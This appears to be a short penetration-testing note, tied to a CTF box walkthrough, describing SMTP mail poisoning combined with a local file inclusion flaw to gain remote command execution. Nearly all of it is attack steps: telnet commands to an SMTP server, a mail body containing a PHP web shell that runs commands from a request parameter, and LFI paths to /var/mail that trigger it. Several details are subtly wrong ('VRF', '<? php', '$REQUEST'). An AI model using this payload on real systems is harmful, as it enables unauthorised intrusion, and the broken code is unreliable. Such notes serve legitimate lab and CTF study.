# Background
- Requirement to exploit this service is to have an associated web application on the same box that is vulnerable to an LFI that displays mail from users in the web application.

# Exploit (ippsec:Beep)
1. Access the SMTP server.
```
telnet [IP] 25
```
2. Confirm that an assumed user is on the box.  This is the user we'll send an email to to exploit the LFI in the web application.
```
VRF [user]@localhost
```
3. Create a new mail to the confirmed user on the box.
```
Mail from:email@doesn'tmatter.com 
Rcpt to: [user]@localhost 
Data 
Subject: Doesn't Matter 
<? php echo system($REQUEST['neogeo']); ?> 
```
4. Go to the web application and abuse the LFI vulnerability to navigate to the file location where our mail was sent and stored to execute the PHP script.
```
.../var/mail/[user]
```
5. If we're able to navigate here with our LFI, then we have command execution through the 'neogeo' variable.
```
.../var/mail/[user]&neogeo=[command]
```
